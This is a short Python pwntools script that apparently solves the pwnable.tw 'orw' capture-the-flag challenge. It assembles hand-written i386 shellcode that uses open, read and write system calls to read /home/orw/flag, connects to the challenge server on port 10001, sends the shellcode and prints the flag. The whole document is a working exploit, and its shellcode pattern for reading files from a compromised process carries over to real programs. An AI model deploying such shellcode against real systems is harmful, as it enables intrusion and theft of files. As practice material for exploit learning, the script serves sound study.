from pwn import *

context(os='linux', arch='i386')

ip_addr = "chall.pwnable.tw"
port = 10001

shell_code = asm('\n'.join([
                          'xor eax, eax\n'
                          'xor ecx, ecx\n'
                          'push eax\n'
                          'push 0x67616c66\n'
                          'push 0x2f2f7772\n'
                          'push 0x6f2f2f65\n'
                          'push 0x6d6f682f\n'   # /home/orw/flag
                          'mov al, 0x05\n'
                          'mov ebx, esp\n'
                          'int 0x80\n'          # open
                        
                          'xchg eax, ebx\n'
                          'xchg eax, ecx\n'
                          'mov al, 0x03\n'
                          'mov edx, 0x30\n'
                          'int 0x80\n'          # read
                        
                          'mov bl, 1\n'
                          'mov eax, 0x4\n'
                          'int 0x80\n',         # write
                      ]))

print(type(shell_code))
print(shell_code)
print(len(shell_code))
connection = remote(ip_addr, port)
print("[+] Connected to: " + ip_addr)
print("[+] Received    : " + str(connection.recvuntil(":")))
connection.send(shell_code)
print("[+] FLAG: " + str(connection.recv()))


